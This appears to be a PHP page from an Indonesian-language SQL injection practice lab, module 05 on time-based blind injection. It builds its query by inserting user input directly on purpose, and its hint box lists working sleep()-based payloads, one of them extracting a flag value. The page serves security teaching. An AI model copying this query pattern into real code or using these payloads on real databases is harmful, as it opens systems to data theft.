<?php
/**
 * =============================================================
 * LAB 05 — Blind SQL Injection Berbasis Waktu (Time-Based)
 * KERENTANAN: Eksfiltrasi data melalui side-channel waktu respon server
 * =============================================================
 */
require_once '../../db.php';

$username = '';
$query_display = "SELECT id, username FROM users WHERE username='\$username'";
$execution_time = 0;
$executed = false;
$error_msg = '';
$flagFeedback = null;

// Penanganan pengiriman flag atau konfirmasi manual
if (isset($_POST['action_progress'])) {
    if ($_POST['action_progress'] === 'submit_flag') {
        $flagFeedback = submitLabFlag('05', $_POST['flag_input'] ?? '');
    } elseif ($_POST['action_progress'] === 'toggle_manual') {
        $flagFeedback = toggleManualLab('05');
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action_progress'])) {
    $username = $_POST['username'] ?? '';
    $raw_query = "SELECT id, username FROM users WHERE username='$username'";
    $query_display = $raw_query;

    try {
        $db = getDB();
        $db->sqliteCreateFunction('sleep', function($seconds) {
            $sec = min((int)$seconds, 10);
            sleep($sec);
            return 1;
        }, 1);

        $start = microtime(true);
        $stmt = $db->query($raw_query);
        $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $execution_time = round(microtime(true) - $start, 3);
        $executed = true;
    } catch (PDOException $e) {
        $error_msg = 'Terjadi error eksekusi: ' . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 05 — Blind Berbasis Waktu | Lab SQLi</title>
    <link rel="stylesheet" href="../../assets/css/style.css">
</head>
<body>
<canvas id="matrix-canvas"></canvas>

<div class="lab-page wrapper">
    <a href="../../index.php" class="nav-back">← KEMBALI KE DASHBOARD</a>

    <div class="lab-header">
        <div class="lab-header-info">
            <div style="color:var(--text-dim); font-size:0.78rem; font-family:'JetBrains Mono',monospace; letter-spacing:2px; margin-bottom:8px;">MODUL 05 / 08</div>
            <h1 style="font-size:1.85rem; margin-bottom:8px;">⏱️ Blind SQLi: Berbasis Waktu</h1>
            <div class="meta" style="display:flex; align-items:center; gap:10px;">
                <span class="badge badge-hard">Sulit</span>
                <span class="vuln-label">⚠ RENTAN</span>
                <span style="color:var(--text-dim); font-size:0.82rem;">Teknik: Analisis Waktu Respon Server (Side-Channel)</span>
                <?php if (isLabCompleted('05')): ?>
                    <span class="badge" style="background:rgba(16,185,129,0.15); color:#34d399; border:1px solid #10b981;">✓ Selesai</span>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <?php if ($flagFeedback): ?>
    <div style="padding:14px 18px; border-radius:10px; margin-bottom:20px; font-weight:600; font-size:0.9rem;
                background: <?= $flagFeedback['success'] ? 'rgba(16,185,129,0.1)' : 'rgba(244,63,94,0.1)' ?>;
                border: 1px solid <?= $flagFeedback['success'] ? '#10b981' : '#f43f5e' ?>;
                color: <?= $flagFeedback['success'] ? '#34d399' : '#fb7185' ?>;">
        <?= htmlspecialchars($flagFeedback['message']) ?>
    </div>
    <?php endif; ?>

    <!-- Deskripsi -->
    <div class="panel">
        <div class="panel-header">
            <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
            <div class="panel-title">DESKRIPSI KERENTANAN</div>
        </div>
        <p style="font-size:0.9rem; color:var(--text-muted); line-height:1.6; margin-bottom:14px;">
            Pada kondisi blind total di mana tidak ada perbedaan output maupun status boolean, penyerang menyuntikkan instruksi jeda waktu (seperti <code>sleep(2)</code>). Jika kondisi tebakan bernilai Benar, server akan menahan responnya selama beberapa detik sebelum membalas.
        </p>
    </div>

    <!-- Kotak Submit Flag / Progres Modul 05 -->
    <?php renderFlagSubmissionBox('05'); ?>

    <div class="grid-2">
        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">🎯 TARGET: FORM PEMERIKSA SENYAP</div>
                </div>
                <form method="POST" id="timeForm">
                    <div class="form-group">
                        <label>Query Nama Pengguna</label>
                        <input type="text" name="username" id="username" 
                               placeholder="Coba payload dengan sleep()..." 
                               value="<?= htmlspecialchars($username) ?>">
                    </div>
                    <button type="submit" class="btn btn-primary btn-full">
                        ▶ &nbsp; KIRIM REQUEST & UKUR WAKTU RESPON
                    </button>
                </form>

                <?php if ($executed): ?>
                <div class="timing-display" style="margin-top:20px; border-color: <?= $execution_time >= 2.0 ? '#10b981' : '#06b6d4' ?>;">
                    <div style="font-size:1.8rem;">⌛</div>
                    <div>
                        <div class="time-label">WAKTU RESPON SERVER</div>
                        <div class="time-value" style="color: <?= $execution_time >= 2.0 ? '#34d399' : '#06b6d4' ?>;">
                            <?= $execution_time ?> detik
                        </div>
                        <div style="font-size:0.75rem; color:var(--text-dim); margin-top:4px;">
                            <?= $execution_time >= 2.0 ? '⚡ TERJADI DELAY: Kondisi bernilai BENAR (TRUE)' : '💨 RESPON CEPAT: Kondisi bernilai SALAH (FALSE)' ?>
                        </div>
                    </div>
                </div>
                <?php endif; ?>

                <?php if ($error_msg): ?>
                <div style="margin-top:15px; color:#f43f5e; background:rgba(244,63,94,0.06); padding:10px; border-radius:6px; border:1px solid rgba(244,63,94,0.3); font-size:0.8rem;">
                    ✗ <?= htmlspecialchars($error_msg) ?>
                </div>
                <?php endif; ?>
            </div>
        </div>

        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">MONITOR QUERY SQL REAL-TIME</div>
                </div>
                <div class="code-block" style="color:#06b6d4; word-break:break-all;">
<?= htmlspecialchars($query_display) ?>
                </div>
            </div>

            <div class="hint-box">
                <button class="hint-toggle" onclick="toggleHint('hint5')">
                    💡 PAYLOAD & UJI WAKTU <span class="arrow">▼</span>
                </button>
                <div class="hint-content" id="hint5">
                    <p><strong style="color:#fbbf24;">Klik payload untuk mengisi input:</strong></p>
                    <ul class="payload-list">
                        <li data-target="username" data-payload="admin' AND (CASE WHEN ((SELECT SUBSTR(value,1,5) FROM flags WHERE name='time_flag')='FLAG{') THEN sleep(2) ELSE 0 END)--">Ekstrak prefiks time_flag: delay ~2 detik</li>
                        <li data-target="username" data-payload="admin' AND sleep(2)--">admin' AND sleep(2)-- (Delay langsung 2 detik)</li>
                        <li data-target="username" data-payload="admin' AND (CASE WHEN (1=1) THEN sleep(2) ELSE 0 END)--">Kondisi Benar: Delay ~2 detik</li>
                        <li data-target="username" data-payload="admin' AND (CASE WHEN (1=2) THEN sleep(2) ELSE 0 END)--">Kondisi Salah: Cepat (&lt; 0.2 detik)</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>

<footer class="site-footer">MODUL 05 — BLIND BERBASIS WAKTU · LAB PRAKTIK SQL INJECTION</footer>
<script src="../../assets/js/main.js"></script>
</body>
</html>
